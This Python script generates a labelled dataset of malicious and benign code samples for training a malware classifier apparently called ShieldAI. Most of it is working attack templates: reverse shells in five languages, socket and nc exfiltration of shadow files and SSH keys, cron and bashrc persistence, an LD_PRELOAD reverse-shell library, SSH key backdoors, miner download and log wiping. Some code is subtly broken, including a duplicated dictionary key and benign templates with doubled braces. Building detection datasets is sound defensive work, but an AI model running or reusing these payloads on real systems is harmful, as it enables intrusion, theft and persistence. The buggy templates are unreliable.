#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Aug  6 12:13:33 2026

@author: hounsousamuel
"""

"""
Générateur de variantes de code pour dataset d'entraînement ShieldAI.
10 familles malveillantes, 11 langages bénins, randomisation systématique.
"""

import os, json, random, string
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent / "output"
OUTPUT_DIR.mkdir(exist_ok=True)

def rand_ip():
    return f"{random.randint(10,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def rand_port():
    return random.choice([4444, 1337, 8080, 9001, 6666, 31337, 8888, 5555, 443, 80])

def rand_name(prefix=""):
    return f"{prefix}{''.join(random.choices(string.ascii_lowercase, k=6))}"

def rand_delay():
    return round(random.uniform(0.1, 3.0), 2)

def rand_wallet():
    return "4" + "".join(random.choices(string.ascii_letters + string.digits, k=20))

SENSITIVE_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/root/.ssh/id_rsa",
    "/home/devops/.ssh/id_rsa", "/home/devops/.env.prod", "/var/www/app/.env",
    "/etc/crontab", "/home/devops/.bash_history", "/etc/nginx/nginx.conf",
    "/home/deploy/.ssh/id_rsa", "/root/.bash_history", "/etc/mysql/my.cnf",
]

STAGING_DIRS = ["/tmp", "/dev/shm", "/var/tmp"]

def rand_files(n=3):
    return random.sample(SENSITIVE_FILES, k=min(n, len(SENSITIVE_FILES)))

def rand_staging():
    return random.choice(STAGING_DIRS)

# =============================================================================
# TEMPLATES MALVEILLANTS
# =============================================================================

MALICIOUS_TEMPLATES = {

    # ── 1. Reverse Shell ─────────────────────────────────────────────────────
    "reverse_shell": {
        "python": lambda: f'''#!/usr/bin/env python3
import socket, subprocess, os, time
time.sleep({rand_delay()})
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{rand_ip()}", {rand_port()}))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
''',
        "bash": lambda: f'''#!/bin/bash
sleep {rand_delay()}
exec 5<>/dev/tcp/{rand_ip()}/{rand_port()}
cat <&5 | while read line; do $line 2>&5 >&5; done
''',
        "php": lambda: f'''<?php
sleep({int(rand_delay())+1});
$sock = fsockopen("{rand_ip()}", {rand_port()});
$proc = proc_open("/bin/sh -i", [0=>$sock,1=>$sock,2=>$sock], $pipes);
?>''',
        "perl": lambda: f'''use Socket;
sleep({int(rand_delay())+1});
$i="{rand_ip()}"; $p={rand_port()};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S");
    exec("/bin/sh -i");
}}''',
        "ruby": lambda: f'''require "socket"
sleep({rand_delay()})
s=TCPSocket.open("{rand_ip()}",{rand_port()})
while(cmd=s.gets); IO.popen(cmd,"r"){{|io| s.print io.read}}; end
''',
    },

    # ── 2. Credential Theft ──────────────────────────────────────────────────
    "credential_theft": {
        "python": lambda: (lambda files: f'''#!/usr/bin/env python3
import time
for path in {files!r}:
    try:
        with open(path,"r") as f:
            print(f"[+] {{path}}: {{len(f.read())}} bytes")
    except Exception as e:
        print(f"[-] {{path}}: {{e}}")
    time.sleep({rand_delay()})
''')(rand_files(random.randint(2,4))),
        "bash": lambda: (lambda files: f'''#!/bin/bash
for f in {" ".join(files)}; do
    [ -r "$f" ] && echo "[+] $f: $(wc -c < "$f") bytes" || echo "[-] $f"
    sleep {rand_delay()}
done
''')(rand_files(random.randint(2,4))),
        "ruby": lambda: (lambda files: f'''{files!r}.each do |f|
  puts "[+] #{{f}}: #{{File.read(f).length}} bytes" if File.readable?(f)
  sleep {rand_delay()}
end
''')(rand_files(random.randint(2,4))),
        "c": lambda: f'''#include <stdio.h>
#include <unistd.h>
int main() {{
    char *targets[] = {{"/etc/passwd", "/etc/shadow", "/root/.ssh/id_rsa", NULL}};
    for (int i=0; targets[i]; i++) {{
        FILE *f = fopen(targets[i], "r");
        if (f) {{ char buf[512]; while(fgets(buf,512,f)); fclose(f); printf("[+] %s read\\n",targets[i]); }}
        else printf("[-] %s\\n", targets[i]);
        sleep(1);
    }}
    return 0;
}}''',
    },

    # ── 3. Persistence ───────────────────────────────────────────────────────
    "persistence": {
        "python": lambda: (lambda name, stg: f'''#!/usr/bin/env python3
import os
payload = "import os; os.system('id')"
with open("{stg}/{name}.py","w") as f: f.write(payload)
os.chmod("{stg}/{name}.py", 0o755)
with open(os.path.expanduser("~/.bashrc"),"a") as f:
    f.write("\\npython3 {stg}/{name}.py &\\n")
print("[+] persistence via bashrc")
''')(rand_name("svc_"), rand_staging()),
        "bash": lambda: (lambda name, stg: f'''#!/bin/bash
cat > {stg}/{name}.sh << 'EOF'
#!/bin/bash
id && hostname
EOF
chmod +x {stg}/{name}.sh
echo "{stg}/{name}.sh &" >> ~/.bashrc
(crontab -l 2>/dev/null; echo "*/5 * * * * {stg}/{name}.sh") | crontab -
echo "[+] persistence installed"
''')(rand_name("svc_"), rand_staging()),
        "python": lambda: (lambda name, stg: f'''#!/usr/bin/env python3
import os, subprocess
with open("/etc/cron.d/{name}","w") as f:
    f.write("*/10 * * * * root {stg}/{name}.sh\\n")
with open("{stg}/{name}.sh","w") as f:
    f.write("#!/bin/bash\\nid\\n")
os.chmod("{stg}/{name}.sh", 0o755)
''')(rand_name("cron_"), rand_staging()),
    },

    # ── 4. Fileless Execution ────────────────────────────────────────────────
    "fileless_exec": {
        "python": lambda: f'''#!/usr/bin/env python3
import ctypes, mmap, base64
shellcode = base64.b64decode("SGVsbG8gV29ybGQh")
mem = mmap.mmap(-1, len(shellcode),
    prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
mem.write(shellcode)
ctypes.CDLL(None).execve(mem, [], [])
''',
        "c": lambda: f'''#include <sys/mman.h>
#include <string.h>
#include <stdio.h>
int main() {{
    unsigned char sc[] = "\\x48\\x65\\x6c\\x6c\\x6f";
    void *mem = mmap(NULL, sizeof(sc),
        PROT_READ|PROT_WRITE|PROT_EXEC,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(mem, sc, sizeof(sc));
    printf("[+] mem=%p\\n", mem);
    return 0;
}}''',
    },

    # ── 5. Cryptominer ───────────────────────────────────────────────────────
    "cryptominer": {
        "python": lambda: f'''#!/usr/bin/env python3
import subprocess
w = "{rand_wallet()}"
subprocess.Popen(["xmrig","-o","stratum+ssl://pool.supportxmr.com:443","-u",w,"-p","x"])
''',
        "bash": lambda: f'''#!/bin/bash
WALLET="{rand_wallet()}"
curl -s -o /tmp/.xmr http://xmrig.com/releases/latest || true
chmod +x /tmp/.xmr 2>/dev/null
/tmp/.xmr -o stratum+ssl://pool.supportxmr.com:443 -u $WALLET -p x &
''',
    },

    # ── 6. Ransomware-like ───────────────────────────────────────────────────
    "ransomware_like": {
        "python": lambda: (lambda stg, ext: f'''#!/usr/bin/env python3
import os, time
for root, dirs, files in os.walk("{stg}"):
    for fname in files[:5]:
        path = os.path.join(root, fname)
        try:
            with open(path,"rb") as f: data = f.read()
            with open(path+".{ext}","wb") as f: f.write(data[::-1])
            os.remove(path)
        except Exception: pass
        time.sleep({rand_delay()})
print("[+] done")
''')(rand_staging(), rand_name("enc_")),
        "bash": lambda: (lambda stg, ext: f'''#!/bin/bash
find {stg} -type f -name "*.txt" 2>/dev/null | head -10 | while read f; do
    rev "$f" > "$f.{ext}" && rm "$f"
    sleep {rand_delay()}
done
echo "[+] done"
''')(rand_staging(), rand_name("enc_")),
    },

    # ── 7. Privilege Escalation ──────────────────────────────────────────────
    "priv_esc": {
        "c": lambda: f'''#include <unistd.h>
#include <stdio.h>
int main() {{
    printf("[*] uid=%d\\n", getuid());
    if (setuid(0) == 0) {{
        printf("[+] setuid(0) OK\\n");
        execl("/bin/sh","sh",NULL);
    }}
    return 0;
}}''',
        "python": lambda: f'''#!/usr/bin/env python3
import os, ctypes
print(f"[*] uid={{os.getuid()}}")
try:
    ctypes.CDLL(None).setuid(0)
    print("[+] setuid(0) tried")
    os.execl("/bin/sh","sh")
except Exception as e:
    print(f"[-] {{e}}")
''',
    },

    # ── 8. LD_PRELOAD Injection ──────────────────────────────────────────────
    "ld_preload": {
        "c": lambda: (lambda name, stg: f'''#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))
void inject() {{
    setuid(0); setgid(0);
    system("/bin/bash -i >& /dev/tcp/{rand_ip()}/{rand_port()} 0>&1");
}}
/* Compile: gcc -shared -fPIC -o {stg}/{name}.so this.c */
/* Use: LD_PRELOAD={stg}/{name}.so ls */
''')(rand_name("lib"), rand_staging()),
        "python": lambda: (lambda name, stg: f'''#!/usr/bin/env python3
import os, subprocess
src = """
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void inject() {{ system("id"); }}
"""
with open("{stg}/{name}.c","w") as f: f.write(src)
subprocess.run(["gcc","-shared","-fPIC","-o",f"{stg}/{name}.so",f"{stg}/{name}.c"])
with open("/etc/ld.so.preload","a") as f: f.write(f"{stg}/{name}.so\\n")
print("[+] LD_PRELOAD injected")
''')(rand_name("lib"), rand_staging()),
    },

    # ── 9. Data Exfiltration via réseau ──────────────────────────────────────
    "data_exfiltration": {
        "python": lambda: (lambda files, ip, port: f'''#!/usr/bin/env python3
import socket, base64, time
targets = {files!r}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{ip}", {port}))
for path in targets:
    try:
        with open(path,"rb") as f: data = f.read()
        payload = base64.b64encode(data)
        s.send(path.encode() + b":" + payload + b"\\n")
        time.sleep({rand_delay()})
    except Exception as e:
        s.send(f"ERR:{{path}}\\n".encode())
s.close()
''')(rand_files(3), rand_ip(), rand_port()),
        "bash": lambda: (lambda files, ip, port: f'''#!/bin/bash
for f in {" ".join(files)}; do
    [ -r "$f" ] && base64 "$f" | nc {ip} {port}
    sleep {rand_delay()}
done
''')(rand_files(3), rand_ip(), rand_port()),
        "php": lambda: (lambda files, ip, port: f'''<?php
$targets = {json.dumps(files)};
$sock = fsockopen("{ip}", {port});
foreach ($targets as $f) {{
    if (is_readable($f)) {{
        $data = base64_encode(file_get_contents($f));
        fputs($sock, $f.":".$data."\\n");
    }}
    sleep(1);
}}
fclose($sock);
?>''')(rand_files(3), rand_ip(), rand_port()),
    },

    # ── 10. Log Tampering / Cover Tracks ─────────────────────────────────────
    "log_tampering": {
        "python": lambda: f'''#!/usr/bin/env python3
import os, time
log_targets = [
    "/var/log/auth.log", "/var/log/syslog",
    "/var/log/nginx/access.log", "/root/.bash_history",
    "/home/devops/.bash_history",
]
for path in log_targets:
    try:
        with open(path,"w") as f: f.write("")
        print(f"[+] cleared: {{path}}")
    except Exception as e:
        print(f"[-] {{path}}: {{e}}")
    time.sleep({rand_delay()})
''',
        "bash": lambda: f'''#!/bin/bash
for f in /var/log/auth.log /var/log/syslog /root/.bash_history; do
    > "$f" 2>/dev/null && echo "[+] cleared $f" || echo "[-] $f"
    sleep {rand_delay()}
done
history -c && unset HISTFILE
''',
    },

    # ── 11. SSH Backdoor / Key Harvesting ────────────────────────────────────
    "ssh_backdoor": {
        "python": lambda: (lambda name: f'''#!/usr/bin/env python3
import os, subprocess
pub_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB {rand_name('attacker@')} malicious"
ssh_dirs = ["/root/.ssh", "/home/devops/.ssh", "/home/ubuntu/.ssh"]
for d in ssh_dirs:
    try:
        os.makedirs(d, exist_ok=True)
        auth_file = os.path.join(d, "authorized_keys")
        with open(auth_file, "a") as f: f.write(pub_key + "\\n")
        os.chmod(auth_file, 0o600)
        print(f"[+] backdoor key added to {{auth_file}}")
    except Exception as e:
        print(f"[-] {{d}}: {{e}}")
for key_file in ["/root/.ssh/id_rsa", "/home/devops/.ssh/id_rsa"]:
    try:
        with open(key_file) as f: print(f"[+] stolen: {{key_file[:20]}}...")
    except: pass
''')(rand_name("bk_")),
        "bash": lambda: f'''#!/bin/bash
PUB="{rand_name("ssh-rsa ")}"
for dir in /root/.ssh /home/ubuntu/.ssh /home/devops/.ssh; do
    mkdir -p "$dir" 2>/dev/null
    echo "$PUB attacker@evil" >> "$dir/authorized_keys" 2>/dev/null
    chmod 600 "$dir/authorized_keys" 2>/dev/null
    echo "[+] $dir"
done
cat /root/.ssh/id_rsa 2>/dev/null | base64
''',
    },

    # ── 12. Docker/Container Escape ──────────────────────────────────────────
    "container_escape": {
        "python": lambda: f'''#!/usr/bin/env python3
import os, subprocess
print("[*] checking escape vectors")
checks = [
    ("docker socket", "/var/run/docker.sock"),
    ("cgroup", "/proc/self/cgroup"),
    ("proc ns", "/proc/1/ns/pid"),
]
for name, path in checks:
    exists = os.path.exists(path)
    print(f"  {{name}}: {{path}} → {{'FOUND' if exists else 'not found'}}")
try:
    with open("/var/run/docker.sock","rb") as f:
        print("[+] docker socket readable — escape possible")
except: pass
try:
    subprocess.run(["cat","/proc/1/environ"], capture_output=True)
    print("[+] /proc/1/environ accessible")
except: pass
''',
    },
}

# =============================================================================
# TEMPLATES BÉNINS
# =============================================================================

BENIGN_TEMPLATES = {
    "python": [
        lambda: '''def fibonacci(n):
    a, b = 0, 1
    for _ in range(n):
        a, b = b, a + b
    return a
print([fibonacci(i) for i in range(20)])
''',
        lambda: (lambda fname: f'''import json, os
data = {{"items": [{{"id": i, "value": i*i}} for i in range(30)]}}
path = "/tmp/{fname}.json"
with open(path,"w") as f: json.dump(data, f)
with open(path,"r") as f: loaded = json.load(f)
print(f"Loaded {{len(loaded['items'])}} items")
os.remove(path)
''')(rand_name("data_")),
        lambda: '''words = "the quick brown fox jumps over the lazy dog".split()
counts = {{}}
for w in words: counts[w] = counts.get(w,0)+1
for w,c in sorted(counts.items()): print(f"{{w}}: {{c}}")
''',
        lambda: '''import math
def is_prime(n):
    if n < 2: return False
    for i in range(2, int(math.sqrt(n))+1):
        if n%i==0: return False
    return True
primes = [n for n in range(2,200) if is_prime(n)]
print(len(primes), "primes found:", primes[:10])
''',
        lambda: '''class Stack:
    def __init__(self): self._data = []
    def push(self, x): self._data.append(x)
    def pop(self): return self._data.pop() if self._data else None
s = Stack()
for i in range(10): s.push(i)
print([s.pop() for _ in range(5)])
''',
    ],
    "bash": [
        lambda: '''#!/bin/bash
total=0
for i in $(seq 1 100); do total=$((total+i)); done
echo "Sum 1..100 = $total"
''',
        lambda: (lambda fname: f'''#!/bin/bash
mkdir -p /tmp/{fname}
for i in 1 2 3 4 5; do
    echo "entry $i" >> /tmp/{fname}/log.txt
done
wc -l /tmp/{fname}/log.txt
rm -rf /tmp/{fname}
''')(rand_name("work_")),
        lambda: '''#!/bin/bash
echo "System info:"
echo "  hostname: $(hostname)"
echo "  uptime: $(uptime -p 2>/dev/null || uptime)"
echo "  disk: $(df -h / | tail -1 | awk "{print $5}")"
''',
    ],
    "javascript": [
        lambda: '''function isPrime(n) {
  if(n<2) return false;
  for(let i=2;i*i<=n;i++) if(n%i===0) return false;
  return true;
}
const primes=[];
for(let i=2;i<100;i++) if(isPrime(i)) primes.push(i);
console.log(primes);
''',
        lambda: '''const items=Array.from({length:20},(_,i)=>({id:i,name:`item-${i}`,score:i*7%13}));
const sorted=items.sort((a,b)=>b.score-a.score);
console.log(JSON.stringify(sorted.slice(0,5)));
''',
        lambda: '''function mergeSort(arr) {
  if(arr.length<=1) return arr;
  const mid=Math.floor(arr.length/2);
  const l=mergeSort(arr.slice(0,mid));
  const r=mergeSort(arr.slice(mid));
  return merge(l,r);
}
function merge(l,r) {
  const res=[];
  let i=0,j=0;
  while(i<l.length&&j<r.length) res.push(l[i]<r[j]?l[i++]:r[j++]);
  return res.concat(l.slice(i)).concat(r.slice(j));
}
console.log(mergeSort([5,3,8,1,9,2,7,4,6]));
''',
    ],
    "go": [
        lambda: '''package main
import "fmt"
func main() {
    sum := 0
    for i:=1;i<=100;i++ { sum+=i }
    fmt.Println("Sum:", sum)
}
''',
        lambda: '''package main
import "fmt"
func fib(n int) int {
    if n<=1 { return n }
    return fib(n-1)+fib(n-2)
}
func main() {
    for i:=0;i<15;i++ { fmt.Printf("fib(%d)=%d\\n",i,fib(i)) }
}
''',
    ],
    "rust": [
        lambda: '''fn main() {
    let v:Vec<i32>=(1..=50).collect();
    let sum:i32=v.iter().sum();
    println!("Sum: {}",sum);
}
''',
        lambda: '''fn bubble_sort(mut v:Vec<i32>)->Vec<i32> {
    let n=v.len();
    for i in 0..n {
        for j in 0..n-1-i {
            if v[j]>v[j+1] { v.swap(j,j+1); }
        }
    }
    v
}
fn main() {
    let sorted=bubble_sort(vec![5,3,8,1,9,2]);
    println!("{:?}",sorted);
}
''',
    ],
    "ruby": [
        lambda: '''def factorial(n)
  (1..n).reduce(1,:*)
end
(1..12).each{|i| puts "#{i}! = #{factorial(i)}"}
''',
        lambda: '''words="hello world foo bar baz".split
puts words.sort.map(&:upcase).inspect
''',
    ],
    "java": [
        lambda: '''import java.util.Arrays;
public class sandbox {
    public static void main(String[] args) {
        int[] arr={5,3,8,1,9,2,7,4,6};
        Arrays.sort(arr);
        for(int x:arr) System.out.print(x+" ");
        System.out.println();
    }
}
''',
        lambda: '''public class sandbox {
    static int fib(int n){return n<=1?n:fib(n-1)+fib(n-2);}
    public static void main(String[] args){
        for(int i=0;i<15;i++) System.out.println("fib("+i+")="+fib(i));
    }
}
''',
    ],
    "c": [
        lambda: '''#include <stdio.h>
int main(){
    int fib[15]={0,1};
    for(int i=2;i<15;i++) fib[i]=fib[i-1]+fib[i-2];
    for(int i=0;i<15;i++) printf("%d\\n",fib[i]);
    return 0;
}
''',
        lambda: '''#include <stdio.h>
#include <string.h>
int main(){
    char s[]="hello world";
    int len=strlen(s);
    for(int i=0;i<len/2;i++){
        char tmp=s[i]; s[i]=s[len-1-i]; s[len-1-i]=tmp;
    }
    printf("%s\\n",s);
    return 0;
}
''',
    ],
    "php": [
        lambda: '''<?php
$data=array();
for($i=0;$i<10;$i++) $data[]=$i*$i;
echo implode(",",$data)."\\n";
?>''',
        lambda: '''<?php
function factorial($n){return $n<=1?1:$n*factorial($n-1);}
for($i=1;$i<=10;$i++) echo "$i! = ".factorial($i)."\\n";
?>''',
    ],
    "perl": [
        lambda: '''my @nums=(1..20);
my @evens=grep{$_%2==0}@nums;
print join(",",@evens),"\\n";
''',
        lambda: '''my $str="hello world";
my @words=split/\\s+/,$str;
print join("-",reverse @words),"\\n";
''',
    ],
    "lua": [
        lambda: '''local function sum(t)
  local s=0
  for _,v in ipairs(t) do s=s+v end
  return s
end
print(sum({1,2,3,4,5,6,7,8,9,10}))
''',
    ],
    "r": [
        lambda: '''x<-c(1,2,3,4,5,6,7,8,9,10)
cat("mean:",mean(x),"sd:",sd(x),"\\n")
''',
    ],
}

EXT={
    "python":"py","bash":"sh","javascript":"js","php":"php",
    "ruby":"rb","perl":"pl","java":"java","go":"go","rust":"rs",
    "lua":"lua","r":"r","powershell":"ps1","c":"c","cpp":"cpp",
}

def generate(n_mal=30, n_ben=40):
    manifest=[]
    
    for family, langs in MALICIOUS_TEMPLATES.items():
        for lang, fn in langs.items():
            for i in range(n_mal):
                try:
                    code=fn()
                    
                except Exception as e:
                    print(f"⚠️  skip {family}/{lang}/{i}: {e}")
                    continue
                
                ext = EXT.get(lang,"txt")
                fname = f"mal_{family}_{lang}_{i:03d}.{ext}"
                (OUTPUT_DIR / fname).write_text(code,encoding="utf-8")
                
                manifest.append({"path":str(OUTPUT_DIR / fname),"label":1,"family":family,"language":lang})
                
    for lang, fns in BENIGN_TEMPLATES.items():
        for t_idx, fn in enumerate(fns):
            for i in range(n_ben):
                try:
                    code=fn()
                    
                except Exception as e:
                    print(f"⚠️  skip benign/{lang}/{i}: {e}")
                    continue
                
                ext = EXT.get(lang,"txt")
                fname = f"benign_{lang}_t{t_idx}_{i:03d}.{ext}"
                (OUTPUT_DIR / fname).write_text(code,encoding="utf-8")
                
                manifest.append({"path":str(OUTPUT_DIR/fname),"label":0,"family":"benign","language":lang})
                
    manifest_path = OUTPUT_DIR/"manifest.json"
    manifest_path.write_text(json.dumps(manifest,indent=2),encoding="utf-8")
    
    n_mal_total = sum(1 for m in manifest if m["label"] == 1)
    n_ben_total = sum(1 for m in manifest if m["label"] == 0)
    
    print(f"✅ {len(manifest)} fichiers | Malveillant: {n_mal_total} | Bénin: {n_ben_total}")
    print(f"   Familles: {sorted(set(m['family'] for m in manifest if m['label']==1))}")
    
    return manifest

if __name__=="__main__":
    generate(n_mal=30, n_ben=40)
    # generate(n_mal=300, n_ben=400)
    pass